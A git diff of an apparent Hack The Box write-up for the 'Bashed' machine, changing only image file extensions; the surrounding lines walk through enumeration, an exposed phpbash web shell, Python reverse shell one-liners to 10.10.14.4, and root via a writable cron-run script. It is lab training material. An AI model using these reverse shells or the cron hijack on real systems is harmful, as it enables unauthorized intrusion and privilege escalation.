@@ -5,11 +5,11 @@ summary: This is the summary for an awesome post.
 tags: hackthebox, writeup
 
 ## Overview
-![writeup.metadata.infocard](/static/files/posts_htb_bashed/infocard.png)
+![writeup.metadata.infocard](/static/files/posts_htb_bashed/infocard.png.webp)
 
 This is a writeup for HTB VM [Bashed](https://www.hackthebox.eu/home/machines/profile/118). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_htb_bashed/killchain.png)
+![writeup.overview.killchain](/static/files/posts_htb_bashed/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -55,13 +55,13 @@ $ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt
   http://10.10.10.68:80/single.html (Status: 200) [Size: 7476]
 ```
 
-![writeup.enumeration.steps.3.1](/static/files/posts_htb_bashed/screenshot03.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_htb_bashed/screenshot03.png.webp)  
 
-![writeup.enumeration.steps.3.2](/static/files/posts_htb_bashed/screenshot01.png)  
+![writeup.enumeration.steps.3.2](/static/files/posts_htb_bashed/screenshot01.png.webp)  
 
 4\. We find that [`phpbash`](https://github.com/Arrexel/phpbash) is a minimal web shell that can give us interactive access to the target machine.  
 
-![writeup.enumeration.steps.4.1](/static/files/posts_htb_bashed/screenshot02.png)  
+![writeup.enumeration.steps.4.1](/static/files/posts_htb_bashed/screenshot02.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -77,7 +77,7 @@ $ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt
 ## Phase #2: Exploitation
 1\. We visit the `/dev/phpbash.min.php` page and find the `phpbash` interactive web shell UI which enables command execution and further enumeration:  
 
-![writeup.exploitation.steps.1.1](/static/files/posts_htb_bashed/screenshot05.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_htb_bashed/screenshot05.png.webp)  
 
 2\. We use a Python reverse shell to obtain interactive access on this system:  
 ```
@@ -85,7 +85,7 @@ nc -nlvp 443
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_htb_bashed/screenshot06.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_htb_bashed/screenshot06.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -128,9 +128,9 @@ sudo -l
 sudo -u scriptmanager /bin/bash
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_htb_bashed/screenshot07.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_htb_bashed/screenshot07.png.webp)  
 
-![writeup.privesc.steps.1.2](/static/files/posts_htb_bashed/screenshot10.png)  
+![writeup.privesc.steps.1.2](/static/files/posts_htb_bashed/screenshot10.png.webp)  
 
 2\. We find an interesting directory `/scripts` which has two files in it. One is a Python script `test.py` owned by user `scriptmanager` and other is `test.txt` owned by `root`. We use a script `CronJobCheckser.sh` and find that there's a `root` owned cronjob that runs the `test.py` script and which creates the `test.txt` file.  
 ```
@@ -138,11 +138,11 @@ ls -la /scripts
 cat /scripts/test.py
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_htb_bashed/screenshot08.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_htb_bashed/screenshot08.png.webp)  
 
-![writeup.privesc.steps.2.2](/static/files/posts_htb_bashed/screenshot09.png)  
+![writeup.privesc.steps.2.2](/static/files/posts_htb_bashed/screenshot09.png.webp)  
 
-![writeup.privesc.steps.2.3](/static/files/posts_htb_bashed/screenshot11.png)  
+![writeup.privesc.steps.2.3](/static/files/posts_htb_bashed/screenshot11.png.webp)  
 
 3\. We can now edit this file to execute a reverse shell that gives us elevated privileges on the system:  
 ```
@@ -150,16 +150,16 @@ nc -nlvp 9999
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >>/scripts/test.py
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_htb_bashed/screenshot12.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_htb_bashed/screenshot12.png.webp)  
 
 4\. As soon as the cronjob runs, we get the elevated shell and can now view the `root.txt` flag file:  
 ```
 cat /root/root.txt
 ```
 
-![writeup.privesc.steps.4.1](/static/files/posts_htb_bashed/screenshot13.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_htb_bashed/screenshot13.png.webp)  
 
-![writeup.privesc.steps.4.2](/static/files/posts_htb_bashed/screenshot14.png)  
+![writeup.privesc.steps.4.2](/static/files/posts_htb_bashed/screenshot14.png.webp)  
 
 ## Learning/Recommendation
 * Production web server instances should not host developement tools like a PHP web shell. It allowed the attacker to gain interactive access of the target system.
